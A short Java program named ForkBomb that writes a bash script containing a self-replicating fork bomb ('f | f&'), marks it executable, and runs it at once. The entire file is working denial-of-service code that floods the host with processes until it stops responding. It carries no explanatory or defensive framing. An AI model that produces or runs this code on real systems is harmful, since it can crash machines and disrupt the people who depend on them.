import java.io.*;
import java.lang.ProcessBuilder;

public class ForkBomb {

    public static void main(String[] args) {
        try (Writer writer = new BufferedWriter(new OutputStreamWriter(
              new FileOutputStream("test.sh"), "utf-8"))) {
            writer.write("#!/usr/bin/env bash\n");
            writer.write("function f() {\n");
            writer.write("f | f&\n");
            writer.write("}\n");
            writer.write("f\n");
        } catch (Exception e) {
            e.printStackTrace();
        }
        run("chmod", "+x", "test.sh");
        run("./test.sh");
    }
    
    private static void run(String... args) {
	try {
	    String output;
	    Process p = new ProcessBuilder(args).start();
	    BufferedReader br = new BufferedReader(
		new InputStreamReader(p.getInputStream()));
	    while ((output = br.readLine()) != null)
		System.out.println(output);
	    p.waitFor();
	    System.out.println ("exit: " + p.exitValue());
	    p.destroy();
	} catch (Exception e) {
	    System.out.println(e);
	}
    }

}
